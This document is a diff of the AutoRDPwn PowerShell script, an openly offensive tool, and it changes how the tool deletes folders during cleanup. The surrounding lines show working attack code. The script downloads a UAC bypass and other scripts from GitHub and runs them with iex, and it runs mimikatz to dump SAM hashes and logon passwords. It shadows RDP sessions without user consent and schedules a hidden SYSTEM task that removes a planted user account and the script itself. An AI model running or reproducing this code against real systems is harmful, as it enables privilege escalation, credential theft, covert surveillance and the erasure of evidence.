@@ -1,7 +1,7 @@
 ﻿[Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("utf-8")
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/AutoBypass.ps1" -UseBasicParsing | iex
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Bypass-UAC "powershell.exe -sta -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" ; exit }
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Design/ColorTool.zip" -Outfile ColorTool.zip -UseBasicParsing ; Expand-Archive .\ColorTool.zip -Force ; .\ColorTool\ColorTool.exe -b campbell 2>&1> $null ; del ColorTool.zip ; cmd /c "rd /s /q ColorTool"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Design/ColorTool.zip" -Outfile ColorTool.zip -UseBasicParsing ; Expand-Archive .\ColorTool.zip -Force ; .\ColorTool\ColorTool.exe -b campbell 2>&1> $null ; del ColorTool.zip ; Remove-Item -path ColorTool -Recurse -Force
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Design/AutoRDPwn.ico" -OutFile AutoRDPwn.ico -UseBasicParsing ; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Design/Set-ConsoleIcon.ps1" -OutFile Set-ConsoleIcon.ps1 -UseBasicParsing ; .\Set-ConsoleIcon.ps1 AutoRDPwn.ico ; del Set-ConsoleIcon.ps1,AutoRDPwn.ico
 $Host.UI.RawUI.BackgroundColor = 'Black' ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; $Host.PrivateData.ErrorForegroundColor = 'Red' ; $Host.PrivateData.WarningForegroundColor = 'Magenta' ; $Host.PrivateData.DebugForegroundColor = 'Yellow' ; $Host.PrivateData.VerboseForegroundColor = 'Green' ; $Host.PrivateData.ProgressForegroundColor = 'White' ; $Host.PrivateData.ProgressBackgroundColor = 'Blue'
 $Host.UI.RawUI.WindowTitle = "AutoRDPwn - v4.5 - by @JoelGMSec" ; $ErrorActionPreference = "SilentlyContinue" ; Set-StrictMode -Off
@@ -265,7 +265,7 @@ if($Language -in 'Spanish') {
 	if($system -in '32 bits') { $mimipath = ".\mimikatz\Win32\" }
 	if($system -in '64 bits') { $mimipath = ".\mimikatz\x64\" }
         powershell $mimipath\mimikatz.exe privilege::debug token::elevate lsadump::sam exit
-        Write-Host "" ; pause ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" }
+        Write-Host "" ; pause ; del .\mimikatz.zip ; Remove-Item -path mimikatz -Recurse -Force }
 
         if($mimikatz -like '2') { Write-Host "$txt10" -ForegroundColor Green ; sleep -milliseconds 2000
 	$osarch = wmic path Win32_OperatingSystem get OSArchitecture | findstr 'bits' ; $system = $osarch.trim()
@@ -275,7 +275,7 @@ if($Language -in 'Spanish') {
 	if($system -in '32 bits') { $mimipath = ".\mimikatz\Win32\" }
 	if($system -in '64 bits') { $mimipath = ".\mimikatz\x64\" }
         powershell $mimipath\mimikatz.exe 'privilege::debug token::elevate sekurlsa::logonPasswords` full exit'
-        Write-Host "" ; pause ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" }
+        Write-Host "" ; pause ; del .\mimikatz.zip ; Remove-Item -path mimikatz -Recurse -Force }
 
         if($mimikatz -in '1','2','m') { $null }
         else { Write-Host "$txt4" -ForegroundColor Magenta }}
@@ -287,7 +287,7 @@ if($Language -in 'Spanish') {
 
         if($module -like '4') { Write-Host "$txt10" -ForegroundColor Green ; Write-Host ; Write-Host "$txt9c" -ForegroundColor Magenta
         Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/RDP-Caching.ps1 -UseBasicParsing | iex ; explorer $env:temp\Recovered_RDP_Session 
-	Write-Host "" ; pause ; cmd /c "rd /s /q $env:temp\Recovered_RDP_Session" }
+	Write-Host "" ; pause ; Remove-Item -path $env:temp\Recovered_RDP_Session -Recurse -Force }
         if($module -in '1','2','3','4','m') { $null }
         else { Write-Host "$txt4" -ForegroundColor Magenta } sleep -milliseconds 2000 }
 
@@ -382,9 +382,9 @@ if($Language -in 'Spanish') {
     if($control -eq 'true') { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }
     else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}
 
-if ($hash){ invoke-command -session $RDP[0] -scriptblock { $script = "Write-Output '`$AutoRDPwn = ls C:\Users\AutoRDPwn* | %{Write-Output `$_.Name}' | iex"
-$script2 = 'net user AutoRDPwn /delete ; cmd.exe /c rd /s /q C:\Users\$AutoRDPwn ; Unregister-ScheduledTask -TaskName AutoRDPwn -Confirm:$false ; $PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript'
-echo $script > $env:TEMP\script.ps1 ; echo $script2 >> $env:TEMP\script.ps1 ; $file = "$env:TEMP\script.ps1"
+if ($hash){ invoke-command -session $RDP[0] -scriptblock { 
+$script = 'net user AutoRDPwn /delete ; Remove-Item -path C:\Users\AutoRDPwn* -Recurse -Force ; Unregister-ScheduledTask -TaskName AutoRDPwn -Confirm:$false ; $PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript'
+echo $script > $env:TEMP\script.ps1 ; $file = "$env:TEMP\script.ps1"
 $action = New-ScheduledTaskAction -Execute powershell -Argument "-ExecutionPolicy ByPass -NoProfile -WindowStyle Hidden $file" ; $time = (Get-Date).AddHours(+2) ; $trigger =  New-ScheduledTaskTrigger -Once -At $time
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "AutoRDPwn" -Description "AutoRDPwn" -TaskPath Microsoft\Windows\Powershell\ScheduledJobs -User "System" > $null }}
 
